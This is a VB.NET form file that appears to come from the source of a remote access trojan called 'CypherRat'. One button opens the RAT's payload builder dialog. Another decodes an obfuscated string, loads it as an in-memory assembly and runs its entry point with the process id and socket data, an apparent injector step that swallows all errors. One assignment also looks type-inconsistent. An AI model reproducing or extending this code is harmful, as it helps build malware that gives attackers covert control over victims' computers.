Imports System.IO
Imports System.Reflection
 Public Class SelecteBilder
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If CypherRat.B Is Nothing Then
             CypherRat.B = New Build
             Select Case CypherRat.B.ShowDialog(Me)
                 Case DialogResult.OK
                     CypherRat.B.Close()
                     CypherRat.B = Nothing
                 Case Else
                     CypherRat.B.Close()
                     CypherRat.B = Nothing
             End Select
         End If
    End Sub
                Private Sub SelecteBilder_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        If CypherRat.APPDOM IsNot Nothing Then
             AppDomain.Unload(CypherRat.APPDOM)
            CypherRat.APPDOM = Nothing
        End If
    End Sub
     Private Sub SelecteBilder_Load(sender As Object, e As EventArgs) Handles MyBase.Load



    End Sub
     Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        If CypherRat.APPDOM Is Nothing Then
            Try
                 CypherRat.APPDOM = AppDomain.CurrentDomain.Load(Codes.GETJECTOR("==ARVRVAEBTBFDFBSTBFERGERGMFHDH")).EntryPoint.Invoke(Nothing, New Object() {New String() {Process.GetCurrentProcess.Id.ToString, sockets.Data.JK}})
             Catch ex As Exception
             End Try
        End If
    End Sub
End Class